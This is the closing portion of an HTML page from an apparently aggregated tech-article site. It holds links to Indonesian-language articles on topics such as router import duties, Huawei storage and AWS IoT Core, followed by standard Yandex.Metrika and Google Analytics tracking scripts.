<li><a href="../id436134/index.html">Hingga 20% tugas bendungan akan dikenakan pada router impor</a></li>
<li><a href="../id436140/index.html">"Di balik penutup" penyimpanan Huawei: teknologi eksklusif, dan apa yang tidak dimiliki orang lain</a></li>
<li><a href="../id436144/index.html">Atasan penghisap darah dalam konteks biocenosis: mengapa tim yang mengatur diri sendiri hancur jika tidak terpusat</a></li>
<li><a href="../id436148/index.html">Kisah satu junior - bagaimana mulai bekerja dan tidak takut pada segalanya</a></li>
<li><a href="../id436150/index.html">Konfigurasikan transfer data perangkat ke AWS IoT Core</a></li>
<li><a href="../id436152/index.html">Kesalahan yang mengajari saya desain berorientasi bisnis</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>